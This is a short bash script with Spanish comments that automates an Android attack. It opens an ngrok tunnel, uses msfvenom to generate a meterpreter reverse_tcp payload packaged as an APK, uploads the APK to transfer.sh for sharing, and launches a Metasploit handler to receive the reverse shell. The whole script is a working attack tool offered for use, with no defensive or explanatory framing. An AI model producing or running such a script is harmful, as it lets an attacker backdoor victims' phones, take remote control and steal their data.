#!/bin/bash
gnome-terminal --working-directory=$(pwd) -e "./ngrok tcp 4569"
clear
printf "NGROK se ejecuta"
echo -e "\t*** https://github.com/its-arun ***"
sleep 3.5;
#Cambiar los valores al payload
pload=android/meterpreter/reverse_tcp;
rport=$( curl -sS http://localhost:4040/api/tunnels | jq '.tunnels[0].public_url' | cut -d ":" -f 3 | sed 's/\"//g' );
#Hacer cambios en los parametros de payload
msfvenom -p $pload LHOST=0.tcp.ngrok.io LPORT=$rport R >$(pwd)/payload.apk
echo "Payload Generated";
ulink=$( curl -sS --upload-file ./payload.apk https://transfer.sh/payload.apk );
echo "Payload APK uploaded at " $ulink;
echo "Starting msfconsole"
touch auto.rc
echo "use exploit/multi/handler
set PAYLOAD $pload
set LHOST 127.0.0.1
set LPORT 4569
exploit" > auto.rc
echo "Exploitation Started";
gnome-terminal --working-directory=$(pwd) -e "msfconsole -r auto.rc"
